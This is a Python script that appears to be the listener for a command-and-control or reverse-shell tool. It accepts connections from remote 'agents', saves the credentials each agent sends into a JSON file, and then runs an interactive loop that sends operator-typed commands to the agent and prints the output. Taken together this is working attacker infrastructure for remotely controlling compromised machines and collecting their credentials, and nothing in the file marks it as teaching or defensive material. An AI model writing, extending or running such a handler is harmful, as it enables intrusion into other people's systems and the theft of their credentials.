import socket
import json

SERVER_HOST = '0.0.0.0'
SERVER_PORT = 5555
CREDENTIALS_FILE = 'agent_credentials.json'

# Load existing credentials from JSON file
try:
    with open(CREDENTIALS_FILE, 'r') as f:
        agent_credentials = json.load(f)
except FileNotFoundError:
    agent_credentials = {}

def save_credentials():
    with open(CREDENTIALS_FILE, 'w') as f:
        json.dump(agent_credentials, f)

def connect_to_agent(agent_id):
    try:
        # Extracting IP address and port from agent ID
        ip, port = agent_id.split(':')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        print(f"[+] Connected back to agent: {agent_id}")
        return s
    except Exception as e:
        print(f"[!] Error connecting back to agent {agent_id}: {str(e)}")
        return None

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print("[+] Listening for incoming connections")

while True:
    client_socket, client_address = s.accept()
    print(f"[+] Accepted connection from {client_address}")
    info = client_socket.recv(1024).decode()
    print(info)

    # Extract credentials from agent info
    credentials = info.splitlines()
    agent_id = f"{client_address[0]}:{client_address[1]}"
    
    # Check if credentials already exist in the dictionary
    if agent_id not in agent_credentials:
        agent_credentials[agent_id] = credentials
        # Save credentials to JSON file
        save_credentials()

    while True:
        command = input("Enter command to execute on agent (type 'exit' to quit): ").strip()
        if command.lower() == "exit":
            client_socket.send("exit".encode())
            client_socket.close()
            break

        client_socket.send(command.encode())
        result = client_socket.recv(1024).decode()
        print(result)

    input()
    break
